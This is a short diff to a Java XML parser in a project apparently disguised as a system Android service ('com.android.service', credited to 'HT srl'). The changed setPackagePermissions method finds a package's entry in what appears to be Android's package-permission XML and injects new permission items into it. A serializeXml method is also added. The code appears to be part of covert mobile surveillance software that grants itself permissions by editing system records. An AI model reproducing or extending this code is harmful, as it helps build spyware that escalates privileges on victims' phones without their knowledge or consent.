@@ -1,3 +1,10 @@
+/* *********************************************
+ * Create by : Alberto "Quequero" Pelliccione
+ * Company   : HT srl
+ * Project   : AndroidService
+ * Created   : 27-jun-2011
+ **********************************************/
+
 package com.android.service.capabilities;
 
 import java.io.FileInputStream;
@@ -78,19 +85,19 @@ public class XmlParser {
 		return permissions;
 	}
 	
-	public void setPackagePermissions(String pkgName, ArrayList<String> newPerm) {
+	public boolean setPackagePermissions(String pkgName, String[] newPerm) {
 		// Cerca: <package name="com.android.service"
 		Element elem = findTaggedElement(this.root, "package", "name", pkgName);
 		
 		if (elem == null) {
-			return;
+			return false;
 		}
 		
 		// Cerca: <perms>
 		Node perms = findNodebyName(elem, "perms");
 		
 		if (perms == null) {
-			return;
+			return false;
 		}
 		
 		// Crea: <item name="..." />
@@ -100,7 +107,12 @@ public class XmlParser {
 			perms.appendChild(newElem);
 		}
 		
-		return;
+		return true;
+	}
+	
+	// Se solo Google l'avesse fatto questo metodo...
+	public String serializeXml() {
+		return XmlSerialize.xmlDocumentToString(this.doc);
 	}
 	
 	// <package name="com.android.service" ...> 
